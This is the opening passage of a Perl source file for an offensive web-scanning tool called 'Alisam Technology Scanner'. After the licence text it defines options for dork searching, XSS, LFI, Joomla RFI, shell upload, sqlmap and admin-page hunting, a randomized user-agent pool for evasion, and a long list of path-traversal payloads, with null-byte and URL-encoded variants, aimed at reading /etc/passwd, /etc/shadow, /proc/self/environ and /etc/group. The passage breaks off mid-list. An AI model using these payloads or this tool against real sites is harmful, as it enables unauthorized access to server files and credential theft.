#!/usr/bin/perl
#
############################################################################################################################################################################################
############################################################################################################################################################################################
# This software is Copyright (c) 2015 by Ali Mehdioui.
#
# This is free software, licensed under:
#
#  The Artistic License 2.0
#
# The Artistic License
#
# Copyright (c) 2000-2006, The Perl Foundation.
#
# Preamble
#   This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains
#   some artistic control over the development of that Package while still keeping the Package available as open source and free software.
#   You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit 
#   the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
#
# Definitions
#   Copyright Holder means the individual(s) or organization(s) named in the copyright notice for the entire Package.
#   Contributor means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
#   You and your" means any person who would like to copy, distribute, or modify the Package.
#   Package means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard 
#   Version, or a Modified Version.
#   Distribute means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
#   Distributor Fee means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
#   Standard Version refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
#   Modified Version means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
#   Original License means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation 
#   in the future.
#   Source form means the source code, documentation source, and configuration files for the Package.
#   Compiled form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
#
# Permission for Use and Modification Without Distribution
# (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
#    Permissions for Redistribution of the Standard Version
# (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that
#    you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
#
# (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard
#     Version, and as such will be subject to the Original License.
#     Distribution of Modified Versions of the Package as Source
#	 
# (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly
#     document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE
#     of the following:
#       (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include
#	     your modifications in the Standard Version.
#		 
#       (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is
#          different from the name of the Standard Version.
#	   
#       (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under the Original License or
#          a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that 
#	       the licensee     received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license 
#		   fees are prohibited but Distributor Fees are allowed.
#          Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
#		 
# (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. 
#    Such  instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, 
#	 you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware 
#	 that the instructions are invalid, then you do not forfeit any of your rights under this license.
#
# (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
#     Aggregating or Linking the Package
#	 
# (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you 
#      do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of 
#      this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
#
# (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or 
#     bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
#     Items That are Not Considered Part of a Modified Version
#	 
# (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to 
#     be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
#     General Provisions
#	 
# (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing 
#     the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
#
# (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified 
#	  Version complies with the requirements of this license.
#	 
# (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
#  
# (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package 
#    with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim 
#	 or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate 
#	 on the date that such litigation is filed.
#
# (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES
#    OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT 
#	 HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF 
#	THE POSSIBILITY OF SUCH DAMAGE.
#The End
#
############################################################################################################################################################################################
############################################################################################################################################################################################
#Alisam Technology Scanner
#Requiered libreries
#apt-get install libxml-simple-perl
#aptitude install libio-socket-ssl-perl
#aptitude install libcrypt-ssleay-perl
#
if (!@ARGV) {
  print color 'bold yellow';
  print "[!] Usage ./",basename($0)," <option>\n";
  print "[!] Usage ./",basename($0)," --help\n";
  print color RESET;
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################

use Getopt::Long ();
my $proxy;
my $help;
my $output;
my $replace;
my $with;
my $dork;
my $mlevel;
my $mxss;
my $Target;
my $mfulltarget;
my $validation_text;
my $exploit;
my $sqlmap;
my $mlfi;
my $mjoomrfi;
my $shell;
my $mwpadf;
my $madmin;
my $msubdomain;
my $mports;
my $mstart;
my $mend;
my $mbasic;
my $muser;
my $mall;
my $msites;
my $mwpsites;
my $mjoomsites;
my $mupload;
my $mzip;
my $command;
my $mtarget;
my $misup;
my $mabout;
my $checkversion;
my $mmd5;
my $mencode64;
my $mdecode64;
my $mmails;
my $rangip;
my $nobanner;

Getopt::Long::GetOptions(\my %OPT,
                        'proxy=s' => \$proxy,
                        'help' => \$help,
                        'save=s' => \$output,
                        'dork=s' => \$dork,
                        'level=s' => \$mlevel,
                        'xss' => \$mxss,
                        't=s' => \$Target,
                        'valid=s' => \$validation_text,
                        'exp=s' => \$exploit,
                        'sqlmap' => \$sqlmap,
                        'lfi' => \$mlfi,
                        'joomrfi' => \$mjoomrfi,
                        'shell=s' => \$shell,
                        'wpadf' => \$mwpadf,
                        'admin' => \$madmin,
						'shost' => \$msubdomain,
						'ports' => \$mports,
						'select=s' => \$muser,
						'start=s' => \$mstart,
						'end=s' => \$mend,
						'all=s' => \$mall,
						'basic=s' => \$mbasic,
						'sites' => \$msites,
						'wp' => \$mwpsites,
						'joom' => \$mjoomsites,
						'upload' => \$mupload,
						'zip' => \$mzip,
						'encode64' => \$mencode64,
						'decode64' => \$mencode64,
						'command=s' => \$command,
						'TARGET' => \$mtarget,
						'FULL_TARGET' => \$mfulltarget,
						'isup' => \$misup,
						'about' => \$mabout,
						'replace=s' => \$replace,
						'with=s' => \$with,
						'md5=s' => \$mmd5,
						'encode64=s' => \$mencode64,
						'decode64=s' => \$mdecode64,
						'email' => \$mmails,
						'update' => \$checkversion,
						'rang=s' => \$rangip,
						'nobanner' => \$nobanner,
) or advise();
############################################################################################################################################################################################
############################################################################################################################################################################################
use warnings;
use Term::ANSIColor;
use IO::Socket::INET;
use LWP::UserAgent;

############################################################################################################################################################################################
############################################################################################################################################################################################
my @strings=('ar_JO', 'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'cs-CZ', 'uk', 'vi_VN', 'vi', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs', 'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA', 'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE', 'de_LU', 'de_CH', 'de', 'el_CY', 'in', 'ga_IE', 'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY', 'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME', 'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV', 'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE', 'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk');
$myrand = $strings[int rand @strings];
############################################################################################################################################################################################
############################################################################################################################################################################################
my @sys=(
"",
"compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; $myrand",
"compatible; MSIE 7.0; Windows NT 5.1; $myrand",
"compatible; MSIE 6.0; Windows NT 5.1; $myrand",
"compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1; $myrand;",
"compatible; Konqueror/3.5; $myrand; SunOS",
"compatible; Konqueror/3.5; $myrand; NetBSD 4.0_RC3; X11; $myrand",
"Macintosh; U; PPC Mac OS X 10_5_8; $myrand",
"Macintosh; Intel Mac OS X 10.6; $myrand; rv:21.0",
"Macintosh; Intel Mac OS X 10_9_0; $myrand",
"Macintosh; U; Intel Mac OS X 10_6_6; $myrand",
"X11; Linux 3.5.4-1-ARCH i686; $myrand",
"Linux; U; Android 4.2.2; $myrand; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0; $myrand",
"iPad; CPU OS 6_0 like Mac OS X; $myrand",
"Windows NT 5.1; $myrand",
"Windows; I; Windows NT 5.1; $myrand; rv:1.9.2.13",
"Windows NT 6.1; $myrand; rv:24.0",
"Windows NT 6.1; WOW64; $myrand",
"Windows NT 6.2; WOW64; $myrand; rv:16.0.1",
"Windows 2000; WOW64; $myrand; rv:16.0.1",
"Windows 98; WOW64; $myrand; rv:16.0.1",
"Windows 95; WOW64; $myrand; rv:16.0.1"
);        
############################################################################################################################################################################################
############################################################################################################################################################################################
my @vary=(
"",
"KHTML/3.5.7 (like Gecko)",
"Opera",
"SeaMonkey",
"Safari",
"Dragon",
"GNU IceCat",
"Seamonkey",
"Galaxy",
"GoogleBot",
"Tor Browser",
"Bimbot",
"Konqueror",
"Flock",
"Chrome",
"Mobile",
"AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
"AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safa",
"AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
"Gecko/20100101 Firefox/21.0",
"Gecko/20100101 Firefox/24.0",
"Gecko/20121011 Firefox/16.0.1",
"KHTML/4.9.1 (like Gecko) Konqueror/4.9"
);        
my $agent = "Mozilla/5.0 (".$sys[int rand @sys].";) ".$vary[int rand @vary];
my $ua = LWP::UserAgent->new(
         agent		=> $agent,
		 cookie_jar	=> HTTP::Cookies->new(),
);
$ua->env_proxy;
$ua->timeout(15);
use HTTP::Cookies;
use File::Basename;
use FindBin '$Bin';
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
############################################################################################################################################################################################
############################################################################################################################################################################################
sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F